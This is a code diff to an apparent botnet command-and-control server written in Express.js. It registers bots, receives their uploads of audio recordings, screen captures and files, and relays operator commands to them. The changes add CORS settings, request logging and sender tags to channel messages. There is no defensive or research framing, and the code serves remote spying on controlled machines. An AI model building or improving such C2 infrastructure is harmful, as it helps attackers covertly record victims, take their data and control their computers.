@@ -2,6 +2,7 @@ const express = require("express");
 const multer = require("multer");
 const logger = require("./logger");
 const {Channel} = require("./channel");
+const cors = require("cors");
 
 const {
     Idle,
@@ -37,16 +38,16 @@ const storage = multer.diskStorage({
 
         if (req.body.uploadType === "audio") {
             const filename = "audio-" + Date.now() + '-' + file.originalname
-            currentChannel.messages.push({ "message" : "File received", "upload" : filename, "uploadType" : "audio"})
+            currentChannel.messages.push({ "from" : "c2", "message" : "File received", "upload" : filename, "uploadType" : "audio"})
             cb(null, filename);
         } else if (req.body.uploadType === "screen") {
             const filename = "screen-" + Date.now() + '-' + file.originalname
-            currentChannel.messages.push({ "message" : "File received", "upload" : filename, "uploadType" : "screen"})
-            cb(null, Date.now() + '-' + filename);
+            currentChannel.messages.push({ "from" : "c2", "message" : "File received", "upload" : filename, "uploadType" : "screen"})
+            cb(null,  filename);
         }
         else {
             const filename = "file-" + Date.now() + '-' + file.originalname
-            currentChannel.messages.push({ "message" : "File received", "upload" : filename, "uploadType" : "file"})
+            currentChannel.messages.push({ "from" : "c2", "message" : "File received", "upload" : filename, "uploadType" : "file"})
             cb(null, filename);
         }
     }
@@ -63,6 +64,9 @@ const port = 3000;
 
 app.use('/backend/storage', express.static(join(__dirname, 'uploads')))
 app.use(express.json());
+app.use(cors( {
+    origin: ['http://localhost:3000', 'http://localhost:3001'],
+}))
 
 const bots = []; // { id: 1, name: "Bot 1", status: "online" },
 
@@ -83,6 +87,7 @@ function registerBot(bot) {
 
 function sendCommand(command) {
     logger.info("sending command : " + command.name + "to : " + command.botId);
+    logger.info(JSON.stringify(command))
     const targetChannel = channels.find((channel) => channel.botId === command.botId)
 
     switch (command.name) {
@@ -190,7 +195,7 @@ function addChannelMessage(botId, message) {
     const targetChannel = channels.find((channel) => channel.botId === botId)
     if (targetChannel) {
         logger.info("Adding message to channel.")
-        targetChannel.messages.push(message)
+        targetChannel.messages.push({"from" : "bot", ...message})
         return
     }
     logger.warn("No channel found for bot : " + botId + " -> aborting message.")
@@ -215,7 +220,7 @@ app.get("/backend/bots", (req, res) => {
 app.post("/backend/commands", (req, res) => {
     const payload = req.body;
     logger.info("receiving a POST request from : " + req.ip);
-
+    logger.info(payload)
     sendCommand({  botId: payload.botId, name: payload.name, args: payload.args });
     logger.info("sending command to bot : " + payload.botId);
     res.send("OK");
